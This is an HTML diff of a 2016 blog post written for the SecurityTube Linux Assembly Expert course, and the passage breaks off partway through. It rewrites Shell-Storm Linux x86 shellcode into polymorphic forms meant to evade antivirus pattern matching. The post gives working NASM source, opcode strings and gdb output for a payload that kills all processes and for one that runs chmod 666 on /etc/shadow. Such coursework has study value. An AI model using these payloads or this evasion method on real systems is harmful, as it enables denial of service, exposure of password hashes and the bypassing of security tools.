@@ -1,0 +1,460 @@
+<!DOCTYPE html>
+<!--[if lt IE 7]><html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]--><!--[if (IE 7)&!(IEMobile)]><html class="no-js lt-ie9 lt-ie8"><![endif]--><!--[if (IE 8)&!(IEMobile)]><html class="no-js lt-ie9"><![endif]--><!--[if gt IE 8]><!--><html class="no-js">
+<!--<![endif]--> <head> <meta charset="UTF-8"> <meta content="text/html; charset=UTF-8" http-equiv="Content-Type"> <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"> <title>SLAE Assignment 6 - Polymorphic Shells – popped.io</title> <meta name="description" content="A collection of my security research, random projects and attempts to amuse."> <meta name="keywords" content="SLAE, SecurityTube, Assignment, Shellcode, nasm, assembly, polymorphic shells"> <!-- Twitter Cards --> <meta name="twitter:card" content="summary"> <meta name="twitter:image" content="http://localhost:4000/assets/img/me.png"> <meta name="twitter:title" content="SLAE Assignment 6 - Polymorphic Shells"> <meta name="twitter:description" content="SLAE Assignment StubThis blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification."> <meta name="twitter:site" content="@skawasec"> <meta name="twitter:creator" content="@skawasec"> <!-- Open Graph --> <meta property="og:locale" content="en_US"> <meta property="og:type" content="article"> <meta property="og:title" content="SLAE Assignment 6 - Polymorphic Shells"> <meta property="og:description" content="SLAE Assignment StubThis blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification."> <meta property="og:url" content="http://localhost:4000/SLAE-Assignment-6/"> <meta property="og:site_name" content="popped.io"> <meta property="og:image" content="http://localhost:4000/assets/img/me.png"> <link rel="canonical" href="http://localhost:4000/SLAE-Assignment-6/"> <link href="http://localhost:4000/feed.xml" type="application/atom+xml" rel="alternate" title="popped.io Feed"> <!-- Handheld --> <meta name="HandheldFriendly" content="True"> <meta name="MobileOptimized" content="320"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <!-- CSS --> <link rel="stylesheet" href="http://localhost:4000/assets/css/main.css"> <!-- JS --> <script src="http://localhost:4000/assets/js/modernizr-3.3.1.custom.min.js"></script> <!-- Favicons --> <link rel="apple-touch-icon" href="http://localhost:4000/assets/img/favicons/apple-icon-precomposed.png"> <link rel="apple-touch-icon" sizes="72x72" href="http://localhost:4000/assets/img/favicons/apple-icon-72x72.png"> <link rel="apple-touch-icon" sizes="114x114" href="http://localhost:4000/assets/img/favicons/apple-icon-114x114.png"> <link rel="apple-touch-icon" sizes="144x144" href="http://localhost:4000/assets/img/favicons/apple-icon-144x144.png"> <link rel="shortcut icon" type="image/png" href="http://localhost:4000/favicon.png"> <link rel="shortcut icon" href="http://localhost:4000/favicon.ico"> <!-- Background Image --> <style type="text/css">body {background-image:url(http://localhost:4000/assets/img/placeholder-big.jpg); background-repeat: no-repeat; background-size: cover; }</style> <!-- Post Feature Image --> </head> <body> <nav id="dl-menu" class="dl-menuwrapper" role="navigation"> <button class="dl-trigger">Open Menu</button> <ul class="dl-menu"> <li><a href="http://localhost:4000/">Home</a></li> <li> <a href="#">About</a> <ul class="dl-submenu"> <li> <img src="http://localhost:4000/assets/img/me.png" alt="popped.io photo" class="author-photo"> <h4>popped.io</h4> <p>A collection of my security research, random projects and attempts to amuse.</p> </li> <li><a href="http://localhost:4000/about/"><span class="btn btn-inverse">Learn More</span></a></li> <li> <a href="http://twitter.com/skawasec" target="_blank" rel="noopener noreferrer"><i class="fa fa-fw fa-twitter-square"></i> Twitter</a> </li> <li> <a href="http://linkedin.com/in/sanjivkawa" target="_blank" rel="noopener noreferrer"><i class="fa fa-fw fa-linkedin-square"></i> LinkedIn</a> </li> <li> <a href="http://github.com/skahwah" target="_blank" rel="noopener noreferrer"><i class="fa fa-fw fa-github"></i> Github</a> </li> </ul>
+<!-- /.dl-submenu --> </li> <li> <a href="#">Posts</a> <ul class="dl-submenu"> <li><a href="http://localhost:4000/posts/">All Posts</a></li> <li><a href="http://localhost:4000/tags/">All Tags</a></li> </ul> </li> <li><a href="http://localhost:4000/projects/">Projects</a></li> </ul>
+<!-- /.dl-menu --> </nav><!-- /.dl-menuwrapper --> <!-- Header --> <header class="header" role="banner"> <div class="wrapper animated fadeIn"> <div class="content"> <div class="post-title "> <h1>SLAE Assignment 6 - Polymorphic Shells</h1> <h4>06 Dec 2016</h4> <p class="reading-time"> <i class="fa fa-clock-o"></i> Reading time ~10 minutes </p>
+<!-- /.entry-reading-time --> <a class="btn zoombtn" href="http://localhost:4000/posts/"> <i class="fa fa-chevron-left"></i> </a> </div> <h3 id="slae-assignment-stub">SLAE Assignment Stub</h3> <p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification.</p> <p><a href="http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a></p> <p>Student ID: SLAE-807</p> <h3 id="assignment-6-requirements">Assignment 6 Requirements</h3> <ul> <li>Take three shellcodes from <a href="http://shell-storm.org/">Shell-Storm</a> and create polymorphic versions of them to beat pattern matching.</li> <li>The polymorphic version can not be larger than 150% of the existing shellcode. So if the existing shellcode is 30 bytes, the polymorphic version can not be larger than 45 bytes.</li> </ul> <h3 id="polymorphic-shell">Polymorphic Shell</h3> <p>The folks over at <a href="https://twitter.com/SecurityTube">SecurityTube</a> have stated that the basic principles of polymorphic shellcode consist of:</p> <ul> <li>Making shellcode look different every time it is created, in terms of the codes fingerprint.</li> <li>Replace existing instructions with instructions that are semantically equivalent so that the functionality of the shellcode is preserved.</li> <li>Add garbage instructions that do not change the functionality in any way. These are called <code class="highlighter-rouge">NOP</code> equivalents or, no operation equivalents. These are instructions that do nothing.</li> </ul> <p>Ultimately, the goal of polymorphic shellcode is to evade antivirus detection.</p> <h3 id="shellcode-1---kill-all-processes">Shellcode 1 - Kill all processes</h3> <p>The author of the original shellcode is Kris Katterjohn. The code can be found <a href="http://shell-storm.org/shellcode/files/shellcode-212.php">here</a>.</p> <h4 id="original-shellcode">Original Shellcode</h4> <div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="c">;By Kris Katterjohn 11/13/2006</span>
+
+<span class="c">;11 byte shellcode to kill all processes for Linux/x86</span>
+<span class="kr">global</span> <span class="n">_start</span>
+
+<span class="kr">section</span> <span class="p">.</span><span class="n">text</span>
+
+<span class="n">_start</span><span class="o">:</span>
+
+  <span class="c">; kill(-1, SIGKILL)</span>
+  <span class="k">push</span> <span class="n">byte</span> <span class="mi">37</span>
+  <span class="k">pop</span> <span class="n">eax</span>
+  <span class="k">push</span> <span class="n">byte</span> <span class="o">-</span><span class="mi">1</span>
+  <span class="k">pop</span> <span class="n">ebx</span>
+  <span class="k">push</span> <span class="n">byte</span> <span class="mi">9</span>
+  <span class="k">pop</span> <span class="n">ecx</span>
+  <span class="k">int</span> <span class="mh">0x80</span>
+</code></pre></div> <h4 id="compiling-the-original-shellcode">Compiling the Original Shellcode</h4> <div class="highlighter-rouge"><pre class="highlight"><code>skawa@ubuntu:~/Desktop/code/assignment/assignment6$ ./compile.sh kill-all-processes-original
+[+] Assembling with Nasm
+[+] Linking
+[+] Extracting Opcodes
+"\x6a\x25\x58\x6a\xff\x5b\x6a\x09\x59\xcd\x80"
+[+] Size: 11 bytes
+skawa@ubuntu:~/Desktop/code/assignment/assignment6$
+</code></pre></div> <h4 id="polymorphic-shellcode">Polymorphic Shellcode</h4> <p>The polymorphic version of the shellcode I have created can be found <a href="https://github.com/skahwah/slae/blob/master/assignment6/kill-all-processes.nasm">here</a></p> <p>Below is an explanation of the changes.</p> <div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="c">;kill-all-processes.nasm</span>
+<span class="c">;this kills all processes on the local system</span>
+<span class="c">;Linux x86</span>
+<span class="c">;Saniv Kawa (@skawasec)</span>
+<span class="c">;www.popped.io</span>
+<span class="c">;December 6, 2016</span>
+<span class="c">;16 bytes</span>
+
+<span class="kr">global</span> <span class="n">_start</span>
+
+<span class="kr">section</span> <span class="p">.</span><span class="n">text</span>
+
+<span class="n">_start</span><span class="o">:</span>
+
+  <span class="k">push</span> <span class="n">byte</span> <span class="mi">9</span>
+  <span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mi">9</span>  <span class="c">;arithmetic for AL register</span>
+  <span class="k">mov</span> <span class="n">cl</span><span class="p">,</span> <span class="mi">4</span> <span class="c">;arithmetic for AL register</span>
+  <span class="k">mul</span> <span class="n">cl</span> <span class="c">;arithmetic for AL register. AL now contains 36</span>
+  <span class="k">inc</span> <span class="n">al</span> <span class="c">;AL now contains the correct syscall number, 37</span>
+  <span class="k">pop</span> <span class="n">ecx</span> <span class="c">;ECX contains 9</span>
+  <span class="k">push</span> <span class="n">byte</span> <span class="o">-</span><span class="mi">1</span>
+  <span class="k">pop</span> <span class="n">ebx</span>
+  <span class="k">int</span> <span class="mh">0x80</span>
+</code></pre></div> <h4 id="compiling-the-polymorphic-shellcode">Compiling the Polymorphic Shellcode</h4> <div class="highlighter-rouge"><pre class="highlight"><code>skawa@ubuntu:~/Desktop/code/assignment/assignment6$ ./compile.sh kill-all-processes
+[+] Assembling with Nasm
+[+] Linking
+[+] Extracting Opcodes
+"\x6a\x09\xb0\x09\xb1\x04\xf6\xe1\xfe\xc0\x59\x6a\xff\x5b\xcd\x80"
+[+] Size: 16 bytes
+skawa@ubuntu:~/Desktop/code/assignment/assignment6$
+</code></pre></div> <h4 id="disassembly-of-the-original-shellcode">Disassembly of the Original Shellcode</h4> <div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="n">skawa</span><span class="err">@</span><span class="n">ubuntu</span><span class="o">:~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">code</span><span class="o">/</span><span class="n">assignment</span><span class="o">/</span><span class="n">assignment6</span><span class="err">$</span> <span class="n">gdb</span> <span class="o">-</span><span class="n">q</span> <span class="p">.</span><span class="o">/</span><span class="n">kill</span><span class="o">-</span><span class="n">all</span><span class="o">-</span><span class="n">processes</span><span class="o">-</span><span class="n">original</span>
+<span class="n">Reading</span> <span class="n">symbols</span> <span class="n">from</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">skawa</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">code</span><span class="o">/</span><span class="n">assignment</span><span class="o">/</span><span class="n">assignment6</span><span class="o">/</span><span class="n">kill</span><span class="o">-</span><span class="n">all</span><span class="o">-</span><span class="n">processes</span><span class="o">-</span><span class="n">original</span><span class="p">...(</span><span class="n">no</span> <span class="n">debugging</span> <span class="n">symbols</span> <span class="n">found</span><span class="p">)...</span><span class="n">done</span><span class="p">.</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">break</span> <span class="n">_start</span>
+<span class="n">Breakpoint</span> <span class="mi">1</span> <span class="n">at</span> <span class="mh">0x8048080</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">run</span>
+<span class="n">Starting</span> <span class="n">program</span><span class="o">:</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">skawa</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">code</span><span class="o">/</span><span class="n">assignment</span><span class="o">/</span><span class="n">assignment6</span><span class="o">/</span><span class="n">kill</span><span class="o">-</span><span class="n">all</span><span class="o">-</span><span class="n">processes</span><span class="o">-</span><span class="n">original</span>
+
+<span class="n">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x08048080</span> <span class="k">in</span> <span class="n">_start</span> <span class="p">()</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">disas</span>
+<span class="n">Dump</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">code</span> <span class="n">for</span> <span class="n">function</span> <span class="n">_start</span><span class="o">:</span>
+<span class="o">=&gt;</span> <span class="mh">0x08048080</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;:</span>	<span class="k">push</span>   <span class="mh">0x25</span>
+   <span class="mh">0x08048082</span> <span class="o">&lt;+</span><span class="mi">2</span><span class="o">&gt;:</span>	<span class="k">pop</span>    <span class="n">eax</span>
+   <span class="mh">0x08048083</span> <span class="o">&lt;+</span><span class="mi">3</span><span class="o">&gt;:</span>	<span class="k">push</span>   <span class="mh">0xffffffff</span>
+   <span class="mh">0x08048085</span> <span class="o">&lt;+</span><span class="mi">5</span><span class="o">&gt;:</span>	<span class="k">pop</span>    <span class="n">ebx</span>
+   <span class="mh">0x08048086</span> <span class="o">&lt;+</span><span class="mi">6</span><span class="o">&gt;:</span>	<span class="k">push</span>   <span class="mh">0x9</span>
+   <span class="mh">0x08048088</span> <span class="o">&lt;+</span><span class="mi">8</span><span class="o">&gt;:</span>	<span class="k">pop</span>    <span class="n">ecx</span>
+   <span class="mh">0x08048089</span> <span class="o">&lt;+</span><span class="mi">9</span><span class="o">&gt;:</span>	<span class="k">int</span>    <span class="mh">0x80</span>
+<span class="n">End</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">dump</span><span class="p">.</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">break</span> <span class="o">*</span><span class="mh">0x08048089</span>
+<span class="n">Breakpoint</span> <span class="mi">2</span> <span class="n">at</span> <span class="mh">0x8048089</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">c</span>
+<span class="n">Continuing</span><span class="p">.</span>
+
+<span class="n">Breakpoint</span> <span class="mi">2</span><span class="p">,</span> <span class="mh">0x08048089</span> <span class="k">in</span> <span class="n">_start</span> <span class="p">()</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">i</span> <span class="n">r</span>
+<span class="n">eax</span>            <span class="mh">0x25</span>	<span class="mi">37</span>
+<span class="n">ecx</span>            <span class="mh">0x9</span>	<span class="mi">9</span>
+<span class="n">edx</span>            <span class="mh">0x0</span>	<span class="mi">0</span>
+<span class="n">ebx</span>            <span class="mh">0xffffffff</span>	<span class="o">-</span><span class="mi">1</span>
+<span class="n">esp</span>            <span class="mh">0xbffff6e0</span>	<span class="mh">0xbffff6e0</span>
+<span class="n">ebp</span>            <span class="mh">0x0</span>	<span class="mh">0x0</span>
+<span class="n">esi</span>            <span class="mh">0x0</span>	<span class="mi">0</span>
+<span class="n">edi</span>            <span class="mh">0x0</span>	<span class="mi">0</span>
+<span class="n">eip</span>            <span class="mh">0x8048089</span>	<span class="mh">0x8048089</span> <span class="o">&lt;</span><span class="n">_start</span><span class="o">+</span><span class="mi">9</span><span class="o">&gt;</span>
+<span class="n">eflags</span>         <span class="mh">0x202</span>	<span class="err">[</span> <span class="n">IF</span> <span class="err">]</span>
+<span class="n">cs</span>             <span class="mh">0x73</span>	<span class="mi">115</span>
+<span class="n">ss</span>             <span class="mh">0x7b</span>	<span class="mi">123</span>
+<span class="n">ds</span>             <span class="mh">0x7b</span>	<span class="mi">123</span>
+<span class="n">es</span>             <span class="mh">0x7b</span>	<span class="mi">123</span>
+<span class="n">fs</span>             <span class="mh">0x0</span>	<span class="mi">0</span>
+<span class="n">gs</span>             <span class="mh">0x0</span>	<span class="mi">0</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span>
+</code></pre></div> <h4 id="disassembly-of-the-polymorphic-shellcode">Disassembly of the Polymorphic Shellcode</h4> <div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="n">skawa</span><span class="err">@</span><span class="n">ubuntu</span><span class="o">:~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">code</span><span class="o">/</span><span class="n">assignment</span><span class="o">/</span><span class="n">assignment6</span><span class="err">$</span> <span class="n">gdb</span> <span class="o">-</span><span class="n">q</span> <span class="p">.</span><span class="o">/</span><span class="n">kill</span><span class="o">-</span><span class="n">all</span><span class="o">-</span><span class="n">processes</span>
+<span class="n">Reading</span> <span class="n">symbols</span> <span class="n">from</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">skawa</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">code</span><span class="o">/</span><span class="n">assignment</span><span class="o">/</span><span class="n">assignment6</span><span class="o">/</span><span class="n">kill</span><span class="o">-</span><span class="n">all</span><span class="o">-</span><span class="n">processes</span><span class="p">...(</span><span class="n">no</span> <span class="n">debugging</span> <span class="n">symbols</span> <span class="n">found</span><span class="p">)...</span><span class="n">done</span><span class="p">.</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">break</span> <span class="n">_start</span>
+<span class="n">Breakpoint</span> <span class="mi">1</span> <span class="n">at</span> <span class="mh">0x8048080</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">run</span>
+<span class="n">Starting</span> <span class="n">program</span><span class="o">:</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">skawa</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">code</span><span class="o">/</span><span class="n">assignment</span><span class="o">/</span><span class="n">assignment6</span><span class="o">/</span><span class="n">kill</span><span class="o">-</span><span class="n">all</span><span class="o">-</span><span class="n">processes</span>
+
+<span class="n">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x08048080</span> <span class="k">in</span> <span class="n">_start</span> <span class="p">()</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">disas</span>
+<span class="n">Dump</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">code</span> <span class="n">for</span> <span class="n">function</span> <span class="n">_start</span><span class="o">:</span>
+<span class="o">=&gt;</span> <span class="mh">0x08048080</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;:</span>	<span class="k">push</span>   <span class="mh">0x9</span>
+   <span class="mh">0x08048082</span> <span class="o">&lt;+</span><span class="mi">2</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">al</span><span class="p">,</span><span class="mh">0x9</span>
+   <span class="mh">0x08048084</span> <span class="o">&lt;+</span><span class="mi">4</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">cl</span><span class="p">,</span><span class="mh">0x4</span>
+   <span class="mh">0x08048086</span> <span class="o">&lt;+</span><span class="mi">6</span><span class="o">&gt;:</span>	<span class="k">mul</span>    <span class="n">cl</span>
+   <span class="mh">0x08048088</span> <span class="o">&lt;+</span><span class="mi">8</span><span class="o">&gt;:</span>	<span class="k">inc</span>    <span class="n">al</span>
+   <span class="mh">0x0804808a</span> <span class="o">&lt;+</span><span class="mi">10</span><span class="o">&gt;:</span>	<span class="k">pop</span>    <span class="n">ecx</span>
+   <span class="mh">0x0804808b</span> <span class="o">&lt;+</span><span class="mi">11</span><span class="o">&gt;:</span>	<span class="k">push</span>   <span class="mh">0xffffffff</span>
+   <span class="mh">0x0804808d</span> <span class="o">&lt;+</span><span class="mi">13</span><span class="o">&gt;:</span>	<span class="k">pop</span>    <span class="n">ebx</span>
+   <span class="mh">0x0804808e</span> <span class="o">&lt;+</span><span class="mi">14</span><span class="o">&gt;:</span>	<span class="k">int</span>    <span class="mh">0x80</span>
+<span class="n">End</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">dump</span><span class="p">.</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">break</span> <span class="o">*</span><span class="mh">0x0804808e</span>
+<span class="n">Breakpoint</span> <span class="mi">2</span> <span class="n">at</span> <span class="mh">0x804808e</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">c</span>
+<span class="n">Continuing</span><span class="p">.</span>
+
+<span class="n">Breakpoint</span> <span class="mi">2</span><span class="p">,</span> <span class="mh">0x0804808e</span> <span class="k">in</span> <span class="n">_start</span> <span class="p">()</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">i</span> <span class="n">r</span>
+<span class="n">eax</span>            <span class="mh">0x25</span>	<span class="mi">37</span>
+<span class="n">ecx</span>            <span class="mh">0x9</span>	<span class="mi">9</span>
+<span class="n">edx</span>            <span class="mh">0x0</span>	<span class="mi">0</span>
+<span class="n">ebx</span>            <span class="mh">0xffffffff</span>	<span class="o">-</span><span class="mi">1</span>
+<span class="n">esp</span>            <span class="mh">0xbffff700</span>	<span class="mh">0xbffff700</span>
+<span class="n">ebp</span>            <span class="mh">0x0</span>	<span class="mh">0x0</span>
+<span class="n">esi</span>            <span class="mh">0x0</span>	<span class="mi">0</span>
+<span class="n">edi</span>            <span class="mh">0x0</span>	<span class="mi">0</span>
+<span class="n">eip</span>            <span class="mh">0x804808e</span>	<span class="mh">0x804808e</span> <span class="o">&lt;</span><span class="n">_start</span><span class="o">+</span><span class="mi">14</span><span class="o">&gt;</span>
+<span class="n">eflags</span>         <span class="mh">0x202</span>	<span class="err">[</span> <span class="n">IF</span> <span class="err">]</span>
+<span class="n">cs</span>             <span class="mh">0x73</span>	<span class="mi">115</span>
+<span class="n">ss</span>             <span class="mh">0x7b</span>	<span class="mi">123</span>
+<span class="n">ds</span>             <span class="mh">0x7b</span>	<span class="mi">123</span>
+<span class="n">es</span>             <span class="mh">0x7b</span>	<span class="mi">123</span>
+<span class="n">fs</span>             <span class="mh">0x0</span>	<span class="mi">0</span>
+<span class="n">gs</span>             <span class="mh">0x0</span>	<span class="mi">0</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span>
+</code></pre></div> <p>After comparing the state of the general purpose registers in the original shellcode and the polymorphic shellcode, it is evident that all replaced instructions are semantically equivalent and the functionality of the original shellcode is preserved.</p> <p>In addition, the size of the original shellcode is 11 bytes. The size of the polymorphic shellcode is 16 bytes, meeting the size restrictions set by SecurityTube.</p> <h3 id="shellcode-2---chmod-666-etcshadow">Shellcode 2 - chmod 666 /etc/shadow</h3> <p>The author of the original shellcode is “root@thegibson”. The code can be found <a href="http://shell-storm.org/shellcode/files/shellcode-566.php">here</a>.</p> <h4 id="original-shellcode-1">Original Shellcode</h4> <div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="c">; linux/x86 chmod 666 /etc/shadow 27 bytes</span>
+<span class="c">; root@thegibson</span>
+<span class="c">; 2010-01-15</span>
+
+<span class="kr">section</span> <span class="p">.</span><span class="n">text</span>
+  <span class="kr">global</span> <span class="n">_start</span>
+
+<span class="n">_start</span><span class="o">:</span>
+  <span class="c">; chmod("//etc/shadow", 0666);</span>
+  <span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mi">15</span>
+  <span class="k">cdq</span>
+  <span class="k">push</span> <span class="n">edx</span>
+  <span class="k">push</span> <span class="n">dword</span> <span class="mh">0x776f6461</span>
+  <span class="k">push</span> <span class="n">dword</span> <span class="mh">0x68732f63</span>
+  <span class="k">push</span> <span class="n">dword</span> <span class="mh">0x74652f2f</span>
+  <span class="k">mov</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">esp</span>
+  <span class="k">mov</span> <span class="n">cx</span><span class="p">,</span> <span class="mi">0666</span><span class="n">o</span>
+  <span class="k">int</span> <span class="mh">0x80</span>
+</code></pre></div> <h4 id="compiling-the-original-shellcode-1">Compiling the Original Shellcode</h4> <div class="highlighter-rouge"><pre class="highlight"><code>skawa@ubuntu:~/Desktop/code/assignment/assignment6$ ./compile.sh chmod-original
+[+] Assembling with Nasm
+[+] Linking
+[+] Extracting Opcodes
+"\xb0\x0f\x99\x52\x68\x61\x64\x6f\x77\x68\x63\x2f\x73\x68\x68\x2f\x2f\x65\x74\x89\xe3\x66\xb9\xb6\x01\xcd\x80"
+[+] Size: 27 bytes
+skawa@ubuntu:~/Desktop/code/assignment/assignment6$
+</code></pre></div> <h4 id="polymorphic-shellcode-1">Polymorphic Shellcode</h4> <p>The polymorphic version of the shellcode I have created can be found <a href="https://github.com/skahwah/slae/blob/master/assignment6/chmod-shadow.nasm">here</a></p> <p>Below is an explanation of the changes.</p> <div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="c">;chmod-shadow.nasm</span>
+<span class="c">;this changes the permissions for /etc/shadow to 666</span>
+<span class="c">;Linux x86</span>
+<span class="c">;Saniv Kawa (@skawasec)</span>
+<span class="c">;www.popped.io</span>
+<span class="c">;December 6, 2016</span>
+<span class="c">;40 bytes</span>
+
+<span class="kr">global</span> <span class="n">_start</span>
+
+<span class="kr">section</span> <span class="p">.</span><span class="n">text</span>
+
+<span class="n">_start</span><span class="o">:</span>
+  <span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mi">8</span> <span class="c">;arithmetic for AL register</span>
+  <span class="k">add</span> <span class="n">al</span><span class="p">,</span> <span class="n">al</span>  <span class="c">;arithmetic for AL register</span>
+  <span class="k">dec</span> <span class="n">al</span> <span class="c">;AL now contains the correct syscall number, 15</span>
+  <span class="k">cdq</span>
+  <span class="k">push</span> <span class="n">ecx</span>  <span class="c">;null terminate</span>
+  <span class="k">push</span> <span class="n">word</span> <span class="mh">0x776f</span>  <span class="c">; wo</span>
+  <span class="k">push</span> <span class="n">word</span> <span class="mh">0x6461</span>  <span class="c">; da</span>
+  <span class="k">push</span> <span class="n">word</span> <span class="mh">0x6873</span>  <span class="c">; hs</span>
+  <span class="k">push</span> <span class="n">word</span> <span class="mh">0x2f63</span>  <span class="c">; /c</span>
+  <span class="k">push</span> <span class="n">word</span> <span class="mh">0x7465</span>  <span class="c">; te</span>
+  <span class="k">push</span> <span class="n">word</span> <span class="mh">0x2f2f</span>  <span class="c">; //</span>
+  <span class="k">mov</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">esp</span>  <span class="c">;stack pointer</span>
+  <span class="k">mov</span> <span class="n">cx</span><span class="p">,</span> <span class="mi">0666</span><span class="n">o</span> <span class="c">; permissions 666</span>
+  <span class="k">int</span> <span class="mh">0x80</span>
+</code></pre></div> <h4 id="compiling-the-polymorphic-shellcode-1">Compiling the Polymorphic Shellcode</h4> <div class="highlighter-rouge"><pre class="highlight"><code>skawa@ubuntu:~/Desktop/code/assignment/assignment6$ ./compile.sh chmod
+[+] Assembling with Nasm
+[+] Linking
+[+] Extracting Opcodes
+"\xb0\x08\x00\xc0\xfe\xc8\x99\x51\x66\x68\x6f\x77\x66\x68\x61\x64\x66\x68\x73\x68\x66\x68\x63\x2f\x66\x68\x65\x74\x66\x68\x2f\x2f\x89\xe3\x66\xb9\xb6\x01\xcd\x80"
+[+] Size: 40 bytes
+skawa@ubuntu:~/Desktop/code/assignment/assignment6$
+</code></pre></div> <h4 id="disassembly-of-the-original-shellcode-1">Disassembly of the Original Shellcode</h4> <div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="n">skawa</span><span class="err">@</span><span class="n">ubuntu</span><span class="o">:~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">code</span><span class="o">/</span><span class="n">assignment</span><span class="o">/</span><span class="n">assignment6</span><span class="err">$</span> <span class="n">gdb</span> <span class="o">-</span><span class="n">q</span> <span class="p">.</span><span class="o">/</span><span class="n">chmod</span><span class="o">-</span><span class="n">original</span>
+<span class="n">Reading</span> <span class="n">symbols</span> <span class="n">from</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">skawa</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">code</span><span class="o">/</span><span class="n">assignment</span><span class="o">/</span><span class="n">assignment6</span><span class="o">/</span><span class="n">chmod</span><span class="o">-</span><span class="n">original</span><span class="p">...(</span><span class="n">no</span> <span class="n">debugging</span> <span class="n">symbols</span> <span class="n">found</span><span class="p">)...</span><span class="n">done</span><span class="p">.</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">break</span> <span class="n">_start</span>
+<span class="n">Breakpoint</span> <span class="mi">1</span> <span class="n">at</span> <span class="mh">0x8048080</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">run</span>
+<span class="n">Starting</span> <span class="n">program</span><span class="o">:</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">skawa</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">code</span><span class="o">/</span><span class="n">assignment</span><span class="o">/</span><span class="n">assignment6</span><span class="o">/</span><span class="n">chmod</span><span class="o">-</span><span class="n">original</span>
+
+<span class="n">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x08048080</span> <span class="k">in</span> <span class="n">_start</span> <span class="p">()</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">disas</span>
+<span class="n">Dump</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">code</span> <span class="n">for</span> <span class="n">function</span> <span class="n">_start</span><span class="o">:</span>
+<span class="o">=&gt;</span> <span class="mh">0x08048080</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">al</span><span class="p">,</span><span class="mh">0xf</span>
+   <span class="mh">0x08048082</span> <span class="o">&lt;+</span><span class="mi">2</span><span class="o">&gt;:</span>	<span class="k">cdq</span>    
+   <span class="mh">0x08048083</span> <span class="o">&lt;+</span><span class="mi">3</span><span class="o">&gt;:</span>	<span class="k">push</span>   <span class="n">edx</span>
+   <span class="mh">0x08048084</span> <span class="o">&lt;+</span><span class="mi">4</span><span class="o">&gt;:</span>	<span class="k">push</span>   <span class="mh">0x776f6461</span>
+   <span class="mh">0x08048089</span> <span class="o">&lt;+</span><span class="mi">9</span><span class="o">&gt;:</span>	<span class="k">push</span>   <span class="mh">0x68732f63</span>
+   <span class="mh">0x0804808e</span> <span class="o">&lt;+</span><span class="mi">14</span><span class="o">&gt;:</span>	<span class="k">push</span>   <span class="mh">0x74652f2f</span>
